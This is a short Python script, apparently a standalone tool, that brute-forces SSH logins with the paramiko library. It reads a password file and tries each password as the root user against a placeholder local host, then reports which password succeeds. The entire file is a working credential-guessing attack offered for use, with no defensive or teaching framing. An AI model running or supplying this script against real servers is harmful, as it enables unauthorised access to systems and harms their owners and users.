import paramiko
import time

def ssh_brute_force(host, port, username, password_list):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    for password in password_list:
        try:
            print(f"[+] Trying password: {password}")
            client.connect(host, port=port, username=username, password=password, timeout=3)
            print(f"[SUCCESS] Password found: {password}")
            return password  
            
        except paramiko.AuthenticationException:
            print(f"[-] Wrong password: {password}")
            
        except Exception as e:
            print(f"[ERROR] {str(e)}")
            time.sleep(1)  
    client.close()
    print("[-] No valid password found in the list.")
    return None

def load_password_list(filepath):
    with open(filepath, "r") as file:
        passwords = [line.strip() for line in file.readlines()]
    return passwords

if __name__ == "__main__":
    host = "192.168.1.X"  
    port = 22 # ssh port 
    username = "root"  
    password_file = "passwords.txt"  

    passwords = load_password_list(password_file)
    
    result = ssh_brute_force(host, port, username, passwords)
    
    if result:
        print(f"[SUCCESS] SSH password found: {result}")
    else:
        print("[-] SSH brute-force failed.")
